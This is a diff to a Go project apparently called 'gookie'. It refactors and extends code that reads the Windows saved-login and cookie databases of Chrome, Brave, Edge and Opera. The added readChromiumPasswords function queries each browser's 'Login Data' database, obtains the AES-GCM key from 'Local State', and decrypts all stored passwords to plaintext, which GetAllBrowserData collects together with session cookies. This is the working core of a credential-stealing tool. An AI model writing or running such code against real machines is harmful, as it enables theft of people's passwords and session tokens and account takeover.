@@ -1,4 +1,4 @@
-package browser
+package chromium
 
 import (
 	"bytes"
@@ -9,11 +9,13 @@ import (
 	"encoding/json"
 	"errors"
 	"fmt"
-	"gookie/pkg/utils"
 	"os"
 	"path/filepath"
 	"syscall"
 	"unsafe"
+
+	_ "github.com/mattn/go-sqlite3"
+	"gookie/pkg/utils"
 )
 
 type Cookie struct {
@@ -54,6 +56,11 @@ const (
 	BraveCookiesPath  = "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies"
 	ChromeCookiesPath = "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies"
 
+	OperaPasswordPath  = "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data"
+	EdgePasswordPath   = "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data"
+	BravePasswordPath  = "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data"
+	ChromePasswordPath = "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
+
 	OperaKeyPath  = "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Local State"
 	EdgeKeyPath   = "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State"
 	BraveKeyPath  = "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State"
@@ -63,6 +70,7 @@ const (
 		is_httponly as HttpOnly, name as Name, path as Path, 
 		is_secure as Secure, value as Value, encrypted_value as EncryptedValue 
 		FROM cookies;`
+	ChromiumPasswordQuery = `SELECT origin_url as URL, username_value as Username, password_value as Password FROM logins;`
 )
 
 var (
@@ -80,42 +88,42 @@ type DataBlob struct {
 }
 
 func GetAllBrowserData() (JSONStruct, error) {
-	bravePasswords, err := ReadBravePasswords()
+	bravePasswords, err := readChromiumPasswords(BravePasswordPath, BraveKeyPath)
 	if err != nil {
 		return JSONStruct{}, fmt.Errorf("ReadBravePasswords: %v", err)
 	}
 
-	braveCookies, err := readChromiumCookies(BraveCookiesPath, ChromiumCookieQuery, BraveKeyPath)
+	braveCookies, err := readChromiumCookies(BraveCookiesPath, BraveKeyPath)
 	if err != nil {
 		return JSONStruct{}, fmt.Errorf("readChromiumCookies: %v", err)
 	}
 
-	chromePasswords, err := ReadChromePasswords()
+	chromePasswords, err := readChromiumPasswords(ChromePasswordPath, ChromeKeyPath)
 	if err != nil {
 		return JSONStruct{}, fmt.Errorf("ReadChromePasswords: %v", err)
 	}
 
-	chromeCookies, err := readChromiumCookies(ChromeCookiesPath, ChromiumCookieQuery, ChromeKeyPath)
+	chromeCookies, err := readChromiumCookies(ChromeCookiesPath, ChromeKeyPath)
 	if err != nil {
 		return JSONStruct{}, fmt.Errorf("readChromiumCookies: %v", err)
 	}
 
-	operaPasswords, err := ReadOperaPasswords()
+	operaPasswords, err := readChromiumPasswords(OperaPasswordPath, OperaKeyPath)
 	if err != nil {
 		return JSONStruct{}, fmt.Errorf("ReadOperaPasswords: %v", err)
 	}
 
-	operaCookies, err := readChromiumCookies(OperaCookiesPath, ChromiumCookieQuery, OperaKeyPath)
+	operaCookies, err := readChromiumCookies(OperaCookiesPath, OperaKeyPath)
 	if err != nil {
 		return JSONStruct{}, fmt.Errorf("readChromiumCookies: %v", err)
 	}
 
-	edgePasswords, err := ReadEdgePasswords()
+	edgePasswords, err := readChromiumPasswords(EdgePasswordPath, EdgeKeyPath)
 	if err != nil {
 		return JSONStruct{}, fmt.Errorf("ReadEdgePasswords: %v", err)
 	}
 
-	edgeCookies, err := readChromiumCookies(EdgeCookiesPath, ChromiumCookieQuery, EdgeKeyPath)
+	edgeCookies, err := readChromiumCookies(EdgeCookiesPath, EdgeKeyPath)
 	if err != nil {
 		return JSONStruct{}, fmt.Errorf("readChromiumCookies: %v", err)
 	}
@@ -196,7 +204,7 @@ func decryptValue(data []byte) ([]byte, error) {
 	}
 }
 
-func readChromiumCookies(path, query, keyPath string) ([]Cookie, error) {
+func readChromiumCookies(path, keyPath string) ([]Cookie, error) {
 	osUser, err := os.UserHomeDir()
 	if err != nil {
 		return nil, err
@@ -213,7 +221,7 @@ func readChromiumCookies(path, query, keyPath string) ([]Cookie, error) {
 	if err != nil {
 		return nil, err
 	}
-	rows, err := dbConn.Query(query)
+	rows, err := dbConn.Query(ChromiumCookieQuery)
 	if err != nil {
 		return nil, err
 	}
@@ -245,6 +253,49 @@ func readChromiumCookies(path, query, keyPath string) ([]Cookie, error) {
 		cookies = append(cookies, cookie)
 	}
 	return cookies, nil
+}
+
+func readChromiumPasswords(path, keyPath string) ([]Password, error) {
+	osUser, err := os.UserHomeDir()
+	if err != nil {
+		return nil, err
+	}
+	passwordsPath := filepath.Join(osUser, path)
+
+	dbConn, err := sql.Open("sqlite3", fmt.Sprintf("file:%s?cache=shared&mode=ro", passwordsPath))
+	if err != nil {
+		return nil, err
+	}
+	defer dbConn.Close()
+
+	err = getAesGCMKey(keyPath)
+	if err != nil {
+		return nil, err
+	}
+	rows, err := dbConn.Query(ChromiumPasswordQuery)
+	if err != nil {
+		return nil, err
+	}
+	defer rows.Close()
+
+	var passwords []Password
+
+	for rows.Next() {
+		var password Password
+
+		err = rows.Scan(&password.URL, &password.Username, &password.PasswordEncrypted)
+		if err != nil {
+			return nil, fmt.Errorf("error scanning row: %w", err)
+		}
+		decrypted, err := decryptValue(password.PasswordEncrypted)
+		if err != nil {
+			return nil, err
+		}
+		password.PasswordDecrypted = string(decrypted)
+		password.PasswordEncrypted = nil
+		passwords = append(passwords, password)
+	}
+	return passwords, nil
 }
 
 func getAesGCMKey(keyPath string) error {
